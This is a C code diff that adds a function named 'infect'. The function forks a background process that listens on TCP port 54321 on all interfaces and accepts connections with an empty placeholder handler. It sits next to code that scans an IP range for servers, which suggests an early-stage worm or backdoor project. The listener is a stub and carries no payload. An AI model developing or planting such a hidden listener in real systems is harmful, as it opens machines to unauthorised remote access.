@@ -59,6 +59,51 @@ void free_list (struct list_server * list){
 	}
 }
 
+int infect(){
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    char port[] = "54321";
+
+    if (sockfd < 0) {
+            printf("Error in connection.\n");
+            exit(1);
+        }
+
+    printf("Server Socket is created.\n");
+
+    struct sockaddr_in addr;
+
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(atoi(port));
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+
+    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
+        perror("bind");
+        return 1;
+    }
+        
+    if (listen(sockfd, 5) == -1) {
+        perror("listen");
+        return 1;
+    }
+
+    if(fork() ==0){
+        while (1) {
+            int client_sock = accept(sockfd, NULL, NULL);
+            if (client_sock == -1) {
+                perror("accept");
+                return 1;
+            }
+
+            // Handle incoming connection here
+            printf("Coucou c'est accepté\n");
+            close(client_sock);
+        }
+    }
+
+    return 0;
+
+}
 
 
 struct list_server * scan_server_available(char * start_IP_str, char * end_IP_str){
